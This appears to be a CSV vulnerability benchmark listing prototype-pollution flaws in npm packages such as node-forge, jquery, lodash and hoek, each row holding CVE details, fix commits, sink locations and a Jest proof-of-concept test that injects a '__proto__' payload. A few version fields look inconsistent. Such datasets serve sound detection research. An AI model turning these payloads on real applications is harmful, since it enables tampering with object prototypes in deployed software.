Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2020-7720,node-forge,0.9.0,0.10.0,prototype-pollution/node-forge_0.9.0,"//https://snyk.io/vuln/SNYK-JAVA-ORGWEBJARSNPM-609293
test(""prototype pollution in node-forge"", () => {
  expect({}.polluted).toBe(undefined);

  const nodeforge = require(""node-forge"");
  const obj = {};
  nodeforge.util.setPath(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/digitalbazaar/forge/commit/51228083550dde97701ac8e06c629a5184117562,lib/util.js:2536:22,https://security.snyk.io/vuln/SNYK-JS-NODEFORGE-598677; https://github.com/advisories/GHSA-92xj-mqp7-vmcj
prototype-pollution,,lutils-merge,0.2.6,n/a,prototype-pollution/lutils-merge_0.2.6,"//https://hackerone.com/reports/439107
test(""prototype pollution in lutils-merge"", () => {
  const merge = require(""lutils-merge"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",n/a,merge.js:156:23,https://security.snyk.io/vuln/SNYK-JS-LUTILSMERGE-174783; https://github.com/advisories/GHSA-f7qw-5pvg-mmwp
prototype-pollution, CVE-2021-25953,putil-merge,3.0.0,3.7.0,prototype-pollution/putil-merge_3.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077
test(""prototype pollution in putil-merge"", () => {
  const putil_merge = require(""putil-merge"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  var obj = {};

  expect({}.polluted).toBe(undefined);

  putil_merge(obj, payload, { deep: true });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/panates/putil-merge/commit/a8f5087faaa034cc2dc2e8070c13014ad6a34043,lib/merge.js:72:19,https://security.snyk.io/vuln/SNYK-JS-PUTILMERGE-1317077; https://github.com/advisories/GHSA-9x7m-9hpg-xxmw
prototype-pollution,CVE-2020-7713,arr-flatten-unflatten,1.1.4,n/a,prototype-pollution/arr-flatten-unflatten_1.1.4,"//https://snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396
test(""prototype pollution in arr-flatten-unflatten"", () => {
  expect({}.polluted).toBe(undefined);

  const { unflatten } = require(""arr-flatten-unflatten"");
  unflatten({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",n/a,unflatten.js:17:16,https://security.snyk.io/vuln/SNYK-JS-ARRFLATTENUNFLATTEN-598396; https://github.com/advisories/GHSA-w8f3-pvx4-4c3h
prototype-pollution,CVE-2019-11358,jquery,1.11.0, 3.4.0,prototype-pollution/jquery_1.11.0,"//https://hackerone.com/reports/454365
test(""prototype pollution in jquery"", () => {
  const { JSDOM } = require(""jsdom"");
  const { window } = new JSDOM("""");
  const $ = require(""jquery"")(window);

  obj = {};

  expect({}.polluted).toBe(undefined);

  $.extend(true, {}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jquery/jquery/commit/753d591aea698e57d6db58c9f722cd0808619b1b,dist/jquery.js:230:21,https://security.snyk.io/vuln/SNYK-JS-JQUERY-174006; https://github.com/advisories/GHSA-6c3j-c64m-qhgq
prototype-pollution,CVE-2020-7702,Templ8,0.7.0,n/a,prototype-pollution/Templ8_0.7.0,"//https://snyk.io/vuln/SNYK-JS-TEMPL8-598770
test(""prototype pollution in Templ8"", () => {
  expect({}.polluted).toBe(undefined);

  const Templ8 = require(""Templ8"");
  const tpl = new Templ8('{{__proto__.polluted=""yes""}}');
  tpl.parse();

  try {
    expect(polluted).toBe(""yes"");
  } catch {
    expect(false).toBe(true);
  }
});
",n/a,,https://security.snyk.io/vuln/SNYK-JS-TEMPL8-598770; https://github.com/advisories/GHSA-c7m7-4257-h698
prototype-pollution,CVE-2020-28461,js-ini,1.2.0,1.3.0,prototype-pollution/js-ini_1.2.0,"//https://snyk.io/vuln/SNYK-JS-JSINI-1048970
test(""prototype pollution in js-ini"", () => {
  const fs = require(""fs"");
  const path = require(""path"");
  const ini = require(""js-ini"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  ini.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.ini""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/Sdju/js-ini/commit/fa17efb7e3a7c9464508a254838d4c231784931e,src/parse.ts:68:58,https://security.snyk.io/vuln/SNYK-JS-JSINI-1048970; 
prototype-pollution,CVE-2021-23426,Proto,1.1.4,n/a,prototype-pollution/Proto_1.1.4,"//https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301
test(""prototype pollution in Proto"", () => {
  const proto = require(""Proto"");
  let payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  proto.merge({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,,https://security.snyk.io/vuln/SNYK-JS-PROTO-1316301; https://github.com/advisories/GHSA-58g2-9fqr-36q2
prototype-pollution,,@uifabric/utilities,7.20.2,7.20.3,prototype-pollution/uifabric-utilities_7.20.2,"//https://snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487
test(""prototype pollution in @uifabric/utilities "", () => {
  const util = require(""@uifabric/utilities"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  const source2 = {
    k3: {},
  };

  expect({}.polluted).toBe(undefined);

  y = util.merge(source2, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,utilities/src/merge.ts:33:21,https://security.snyk.io/vuln/SNYK-JS-UIFABRICUTILITIES-571487; 
prototype-pollution,CVE-2021-23820,json-pointer,0.6.0,n/a,prototype-pollution/json-pointer_0.6.0,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test(""prototype pollution in json-pointer"", () => {
  const pointer = require(""json-pointer"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set(obj, ""/__proto__/polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/manuelstofer/json-pointer/pull/34/files,index.js:91:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925; https://github.com/advisories/GHSA-v5vg-g7rq-363w
prototype-pollution,CVE-2018-3728,hoek,5.0.0,5.0.3,prototype-pollution/hoek_5.0.0,"//https://snyk.io/vuln/npm:hoek:20180212
test(""prototype pollution in hoek"", () => {
  const Hoek = require(""hoek"");
  obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  Hoek.merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/hapijs/hoek/commit/32ed5c9413321fbc37da5ca81a7cbab693786dee,lib/index.js:137:29,https://security.snyk.io/vuln/npm:hoek:20180212; https://github.com/advisories/GHSA-jp4x-w63m-7wgm
prototype-pollution,CVE-2020-28267,@strikeentco/set,1.0.0,1.0.1,prototype-pollution/strikeentco-set_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28267
test(""prototype pollution in strikeentco/set "", () => {
  const sset = require(""@strikeentco/set"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  sset(obj, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/strikeentco/set/commit/102cc6b2e1d1e0c928ced87e75df759d5541ff60,set/main.js:11:17,https://security.snyk.io/vuln/SNYK-JS-STRIKEENTCOSET-1038821; 
prototype-pollution,CVE-2021-25927,safe-flat,2.0.0,2.0.2,prototype-pollution/safe-flat_2.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25927
test(""prototype pollution in safeFlat"", () => {
  var safeFlat = require(""safe-flat"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeFlat.unflatten({ ""__proto__.polluted"": ""yes"" }, "".""); //payload
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,src/index.js:48:30,https://security.snyk.io/vuln/SNYK-JS-SAFEFLAT-1277112; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
prototype-pollution,CVE-2020-8116,dot-prop,2.0.0,5.1.1,prototype-pollution/dot-prop_2.0.0,"//https://snyk.io/test/npm/dot-prop/2.0.0
test(""prototype pollution in dot-prop"", () => {
  expect({}.polluted).toBe(undefined);

  const dotProp = require(""dot-prop"");
  dotProp.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/sindresorhus/dot-prop/commit/3039c8c07f6fdaa8b595ec869ae0895686a7a0f2,index.js:32:14,https://security.snyk.io/vuln/SNYK-JS-DOTPROP-543489; https://github.com/advisories/GHSA-ff7x-qrg7-qggm
prototype-pollution,CVE-2021-25941,deep-override,1.0.0,1.0.2,prototype-pollution/deep-override_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25941
test(""prototype pollution in deep-override"", () => {
  expect({}.polluted).toBe(undefined);

  const deepOverride = require(""deep-override"");
  deepOverride({}, JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}'));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/ASaiAnudeep/deep-override/commit/2aced17651fb684959a6e04b1465a8329b3d5268,src/index.js:53:23,https://security.snyk.io/vuln/SNYK-JS-DEEPOVERRIDE-1292344; https://github.com/advisories/GHSA-v659-54cx-g4qr
prototype-pollution,CVE-2021-23417,deepmergefn,1.1.0,n/a,prototype-pollution/deepmergefn_1.1.0,"//https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984
test(""prototype pollution in deepmergefn"", () => {
  const deepMerge = require(""deepmergefn"");

  expect({}.polluted).toBe(undefined);

  EVIL_DATA = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  deepMerge({}, EVIL_DATA);

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:12:30,https://security.snyk.io/vuln/SNYK-JS-DEEPMERGEFN-1310984; https://github.com/advisories/GHSA-vj72-mwrj-m2xq
prototype-pollution,CVE-2021-3766,objection,2.0.0,3.0.0-alpha.5,prototype-pollution/objection_2.0.0,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910
test(""prototype pollution in objection"", () => {
  const objectUtils = require(""objection/lib/utils/objectUtils"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  objectUtils.set(obj, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/vincit/objection.js/commit/b41aab8dcd78f426f7468dcda541a7aca18a66a6,lib/utils/objectUtils.js:246:32,https://security.snyk.io/vuln/SNYK-JS-OBJECTION-1582910; https://github.com/advisories/GHSA-r659-8xfp-j327
prototype-pollution,CVE-2020-8268,json8-merge-patch,1.0.1,1.0.3,prototype-pollution/json8-merge-patch_1.0.1,"//https://hackerone.com/reports/980649
test(""prototype pollution in json8-merge-patch"", () => {
  expect({}.polluted).toBe(undefined);

  const json8mergepatch = require(""json8-merge-patch"");
  json8mergepatch.apply(
    {},
    JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}')
  );

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/apply.js:25:12,https://security.snyk.io/vuln/SNYK-JS-JSON8MERGEPATCH-1038399; https://github.com/advisories/GHSA-8v9x-9xqg-r8mr
prototype-pollution,CVE-2020-7725,worksmith,1.0.0,n/a,prototype-pollution/worksmith_1.0.0,"//https://snyk.io/vuln/SNYK-JS-WORKSMITH-598798

test(""prototype pollution in worksmith"", () => {
  const worksmith = require(""worksmith"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  worksmith.setValue({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:300:30,https://security.snyk.io/vuln/SNYK-JS-WORKSMITH-598798; https://github.com/advisories/GHSA-9829-jj5p-j6hf
prototype-pollution,CVE-2019-10794,component-flatten,1.0.1,n/a,prototype-pollution/component-flatten_1.0.1,"//snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907
https: test(""prototype pollution in component-flatten"", () => {
  expect({}.polluted).toBe(undefined);

  const cf = require(""component-flatten"");
  let tree = { ref: ""polluted"", name: ""__proto__"" };
  cf(tree);

  expect({}.polluted).not.toBe(undefined);
});
",n/a,index.js:56:26,https://security.snyk.io/vuln/SNYK-JS-COMPONENTFLATTEN-548907; 
prototype-pollution,,upmerge,0.1.7,0.1.8,prototype-pollution/upmerge_0.1.7,"//https://snyk.io/vuln/SNYK-JS-UPMERGE-174133
test(""prototype pollution in upmerge"", () => {
  let upmerge = require(""upmerge""); // this version is vulnerable
  let payload = '{""__proto__"":{ ""polluted"" : ""yes"" } }'; // this comes from network
  obj = {};

  expect({}.polluted).toBe(undefined);
  upmerge.merge({}, JSON.parse(payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,build/upmerge.js:1:1247,https://security.snyk.io/vuln/SNYK-JS-UPMERGE-174133; https://github.com/advisories/GHSA-gm9g-2g8v-fvxj
prototype-pollution,CVE-2019-10792,bodymen,1.0.0,1.1.1,prototype-pollution/bodymen_1.0.0,"//https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b

test(""prototype pollution in bodymen "", () => {
  const x = require(""bodymen"");
  //a.handler(""__proto__"",""polluted"",""yes"");
  expect({}.polluted).toBe(undefined);

  x.handler(""__proto__"", ""polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/diegohaz/bodymen/commit/5d52e8cf360410ee697afd90937e6042c3a8653b,dist/index.js:44:26,https://security.snyk.io/vuln/SNYK-JS-BODYMEN-548897; https://github.com/advisories/GHSA-8h84-8j4f-p97q
prototype-pollution,CVE-2021-23370,swiper,6.5.0,6.5.1,prototype-pollution/swiper_6.5.0,"//https://snyk.io/vuln/SNYK-JS-SWIPER-1088062
test(""prototype pollution in swiper"", () => {
  var swiper = require(""swiper"");
  let obj = {};
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  swiper.default.extendDefaults(JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/nolimits4web/swiper/commit/9dad2739b7474f383474773d5ab898a0c29ac178,cjs/utils/utils.js:110:25,https://security.snyk.io/vuln/SNYK-JS-SWIPER-1088062; https://github.com/advisories/GHSA-p3hc-fv2j-rp68
prototype-pollution,CVE-2021-25944,deep-defaults,1.0.5,n/a,prototype-pollution/deep-defaults_1.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944
test(""prototype pollution in dot-object "", () => {
  var deepDefaults = require(""deep-defaults"");
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  var obj = {};

  expect({}.polluted).toBe(undefined);

  deepDefaults(obj, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/index.js:16:21,https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25944; 
prototype-pollution,,smart-extend,1.7.3,n/a,prototype-pollution/smart-extend_1.7.3,"//https://hackerone.com/reports/438274

test(""prototype pollution in smart-extend"", () => {
  var extend = require(""smart-extend"");
  obj = {};

  expect({}.polluted).toBe(undefined);
  var payload = '{""__proto__"":{""polluted"":""yes""}}';

  extend.deep({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",n/a,dist/smart-extend.js:1:2739,https://security.snyk.io/vuln/SNYK-JS-SMARTEXTEND-174739; https://github.com/advisories/GHSA-f8h3-rqrm-47v9
prototype-pollution,CVE-2021-25916,patchmerge,1.0.0,1.0.2,prototype-pollution/patchmerge_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
test(""prototype pollution in patchmerge"", () => {
  const patchMerge = require(""patchmerge"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  patchMerge(obj, JSON.parse('{ ""__proto__"": { ""polluted"": ""yes"" }}'));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/pjshumphreys/patchmerge/commit/5b383c537eae7a00ebd26d3f7211dac99ddecb12,index.js:93:24,https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585; https://github.com/advisories/GHSA-84g3-cv89-m9gm
prototype-pollution,,node-ini,1.0.0,n/a,prototype-pollution/node-ini_1.0.0,"//https://security.snyk.io/vuln/SNYK-JS-NODEINI-1054844
test(""prototype pollution in node-ini"", () => {
  const ini = require(""node-ini"");

  expect({}.polluted).toBe(undefined);

  ini.parse(""./payload.ini"", function (err, data) {
    expect({}.polluted).toBe(""yes"");
  });
});
",,node-ini.js:25:66,https://security.snyk.io/vuln/SNYK-JS-NODEINI-1054844; 
prototype-pollution,CVE-2020-28268,controlled-merge,1.0.0,1.3.0,prototype-pollution/controlled-merge_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268
test(""prototype pollution in controlled-merge "", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""controlled-merge"");
  const obj = merge(
    {},
    JSON.parse(
      '{ ""testProperty"": ""hi"", ""prototype"" : { ""polluted"" : ""yes"" } }'
    ),
    true
  );

  expect(obj.prototype.polluted).toBe(""yes"");
});
",https://github.com/hlfshell/controlled-merge/commit/5a4b2e9ffe5a0be7f8843d4ab038599d3ae5f9d4,,https://security.snyk.io/vuln/SNYK-JS-CONTROLLEDMERGE-1040460; https://github.com/advisories/GHSA-5pg7-v24c-9rp9
prototype-pollution,CVE-2019-10750,deeply,3.0.0,3.1.0,prototype-pollution/deeply_3.0.0,"//https://snyk.io/vuln/SNYK-JS-DEEPLY-451026
test(""prototype pollution in deeply "", () => {
  const mergeFn = require(""deeply"");
  const payload = '{""__proto__"": {""polluted"": ""yes""}}';
  var obj = {};

  expect({}.polluted).toBe(undefined);

  mergeFn({}, JSON.parse(payload));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/alexindigo/deeply/commit/6eccb2f03ec8d3eefc6805053c4cc2a36aab1505,lib/reduce_object.js:19:14,https://security.snyk.io/vuln/SNYK-JS-DEEPLY-451026; https://github.com/advisories/GHSA-8j4w-5fw4-rm27
prototype-pollution,CVE-2019-10795,undefsafe,2.0.2,2.0.3,prototype-pollution/undefsafe_2.0.2,"//https://snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940
test(""prototype pollution in undefsafe "", () => {
  expect({}.polluted).toBe(undefined);

  const a = require(""undefsafe"");
  const obj = {};
  const payload = ""__proto__.polluted"";
  a({}, payload, ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/remy/undefsafe/commit/f272681b3a50e2c4cbb6a8533795e1453382c822,lib/undefsafe.js:106:17,https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940; 
prototype-pollution,CVE-2020-7639,eivindfjeldstad-dot,0.0.1,n/a,prototype-pollution/eivindfjeldstad-dot_0.0.1,"//https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434
test(""prototype pollution in eivindfjeldstad-dot"", () => {
  const a = require(""eivindfjeldstad-dot"");

  expect({}.polluted).toBe(undefined);

  let path = ""__proto__.polluted"";
  a.set({}, path, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/eivindfjeldstad/dot/commit/774e4b0c97ca35d2ae40df2cd14428d37dd07a0b,index.js:20:13,https://security.snyk.io/vuln/SNYK-JS-EIVINDFJELDSTADDOT-564434; 
prototype-pollution,CVE-2020-7715,deep-get-set,1.1.0,n/a,prototype-pollution/deep-get-set_1.1.0,"test(""prototype pollution in deep-get-set"", () => {
  const deep = require(""deep-get-set"");

  expect({}.polluted).toBe(undefined);

  deep({}, [new String(""__proto__""), ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:30:16,https://security.snyk.io/vuln/SNYK-JS-DEEPGETSET-598666; https://github.com/advisories/GHSA-85cp-p426-42f5
prototype-pollution,,getsetdeep,4.15.0,n/a,prototype-pollution/getsetdeep_4.15.0,"test(""prototype pollution in getsetdeep"", () => {
  const pkg = require(""getsetdeep"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pkg.setDeep(obj, ""__proto__.polluted"", ""yes"");

  expect(obj.polluted).toBe(""yes"");
});
",n/a,edition-esnext/index.js:74:17,https://github.com/advisories/GHSA-8j49-49jq-vwcq; 
prototype-pollution,CVE-2018-3721 ,lodash,4.17.15,4.17.5,prototype-pollution/lodash_4.17.15,"//https://security.snyk.io/vuln/SNYK-JS-LODASH-608086
test(""prototype pollution in lodash"", () => {
  const lod = require(""lodash"");
  let obj = {};
  expect({}.polluted).toBe(undefined);
  lod.set(obj, ""__proto__[polluted]"", ""yes"");
  expect({}.polluted).toBe(""yes"");
  delete obj.__proto__.polluted; // deletes the property set by this pollution
});

test(""prototype pollution in lodash"", () => {
  const lod = require(""lodash"");
  expect({}.polluted).toBe(undefined);
  lod.setWith({}, ""__proto__[polluted]"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lodash/lodash/commit/d8e069cc3410082e44eb18fcf8e7f3d08ebe1d4a,lodash.js:2559:21,https://security.snyk.io/vuln/SNYK-JS-LODASH-608086; https://github.com/advisories/GHSA-fvqr-27wr-82fm
prototype-pollution,CVE-2021-25916,patchmerge,1.0.1,1.0.2,prototype-pollution/patchmerge_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585
test(""prototype pollution in patchMerge"", () => {
  var patchMerge = require(""patchmerge"");
  var obj = {};
  expect({}.polluted).toBe(undefined);
  patchMerge(obj, JSON.parse('{""__proto__"": { ""polluted"": ""yes"" }}'));
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/pjshumphreys/patchmerge/commit/5b383c537eae7a00ebd26d3f7211dac99ddecb12,index.js:93:24,https://security.snyk.io/vuln/SNYK-JS-PATCHMERGE-1086585; https://github.com/advisories/GHSA-84g3-cv89-m9gm
prototype-pollution,CVE-2020-7638,confinit,0.3.0,0.4.0,prototype-pollution/confinit_0.3.0,"//https://snyk.io/vuln/SNYK-JS-CONFINIT-564433
test(""prototype pollution in confinit"", () => {
  const root = require(""confinit"");
  const payload = ""__proto__.polluted"";

  expect({}.polluted).toBe(undefined);

  root.setDeepProperty({}, payload, ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/davideicardi/confinit/commit/a34e06ca5c1c8b047ef112ef188b2fe30d2a1eab,index.ts:112:15,https://security.snyk.io/vuln/SNYK-JS-CONFINIT-564433; https://github.com/advisories/GHSA-jgpq-g82g-6c39
prototype-pollution,CVE-2020-7704,linux-cmdline,1.0.0,1.0.1,prototype-pollution/linux-cmdline_1.0.0,"//https://snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674
test(""prototype pollution in linux-cmdline"", () => {
  expect({}.polluted).toBe(undefined);

  const linuxCmdline = require(""linux-cmdline"");
  linuxCmdline(""__proto__.polluted=yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/piranna/linux-cmdline/commit/53c61a88bc47eb25d71832205056beaab95cf677,index.js:48:15,https://security.snyk.io/vuln/SNYK-JS-LINUXCMDLINE-598674; 
prototype-pollution,CVE-2021-25948,expand-hash,1.0.1,n/a,prototype-pollution/expand-hash_1.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25948
test(""prototype pollution in expand-hash "", () => {
  var expandHash = require(""expand-hash"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  expandHash({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:19:13,https://security.snyk.io/vuln/SNYK-JS-EXPANDHASH-1303101; https://github.com/advisories/GHSA-x3wr-v4wx-5qpc
prototype-pollution,CVE-2020-7637,class-transformer,0.1.1,0.3.1,prototype-pollution/class-transformer_0.1.1,"//https://snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431
test(""prototype pollution in class-transformer"", () => {
  expect({}.polluted).toBe(undefined);

  const root = require(""class-transformer"");
  const payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  root.classToPlainFromExist(payload, {});

  expect({}.polluted).toBe(""yes"");
});
",n/a,TransformOperationExecutor.ts:163:46,https://security.snyk.io/vuln/SNYK-JS-CLASSTRANSFORMER-564431; https://github.com/advisories/GHSA-6gp3-h3jj-prx4
prototype-pollution,CVE-2021-23328,iniparserjs,1.0.4,n/a,prototype-pollution/iniparserjs_1.0.4,"//https://security.snyk.io/vuln/SNYK-JS-INIPARSERJS-1065989
test(""prototype pollution in iniparserjs"", () => {
  expect({}.polluted).toBe(undefined);

  var path = require(""path"");
  var IniParser = require(""iniparserjs"");

  var config = new IniParser(path.join(__dirname, ""test.ini""), ""UTF8"");
  // var sections = config.sections()
  // var keysOfSection1 = config.keysOfSection(""section1"")
  console.log(""After:"", {}.polluted);

  expect({}.polluted).toBe(""yes"");
});
",n/a,ini_parser.js:63:50,https://security.snyk.io/vuln/SNYK-JS-INIPARSERJS-1065989; https://github.com/advisories/GHSA-2f6g-w5gj-c93h
prototype-pollution,CVE-2020-28282,getobject,0.1.0,1.0.0,prototype-pollution/getobject_0.1.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28282
test(""prototype pollution in getobject"", () => {
  expect({}.polluted).toBe(undefined);

  const getObject = require(""getobject"");
  var obj = {};
  console.log(""Before  : "" + obj.polluted);
  getObject.set(obj, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/getobject.js:48:23,https://security.snyk.io/vuln/SNYK-JS-GETOBJECT-1054932; https://github.com/advisories/GHSA-957j-59c2-j692
prototype-pollution,CVE-2019-10798,rdf-graph-array,0.3.0,n/a,prototype-pollution/rdf-graph-array_0.3.0,"//https://snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803
test(""prototype pollution in rdf-graph-array"", () => {
  const Graph = require(""rdf-graph-array"").Graph;
  let g = new Graph();

  expect({}.polluted).toBe(undefined);

  g.add({
    graph: ""foo"",
    subject: ""__proto__"",
    predicate: ""polluted"",
    object: ""JHU"",
  });

  expect({}.polluted).not.toBe(undefined);
});
",n/a,index.js:208:29,https://security.snyk.io/vuln/SNYK-JS-RDFGRAPHARRAY-551803; https://github.com/advisories/GHSA-prv2-xwr7-hr57
prototype-pollution,CVE-2020-28277,dset,1.0.0,2.1.0,prototype-pollution/dset_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28277
test(""prototype pollution in dset"", () => {
  expect({}.polluted).toBe(undefined);

  const dset = require(""dset"");
  dset({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,dist/dset.js:6:18,https://security.snyk.io/vuln/SNYK-JS-DSET-1054939; 
prototype-pollution,CVE-2021-23396,lutils,2.4.0,n/a,prototype-pollution/lutils_2.4.0,"//https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023
test(""prototype pollution in lutils"", () => {
  const lt = require(""lutils"");
  let obj = {};
  expect({}.polluted).toBe(undefined);

  let EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  lt.merge({}, EVIL_JSON);

  expect({}.polluted).toBe(""yes"");
});
",n/a,merge/merge.ts:114:18,https://security.snyk.io/vuln/SNYK-JS-LUTILS-1311023; https://github.com/advisories/GHSA-3r8w-mphv-2f3f
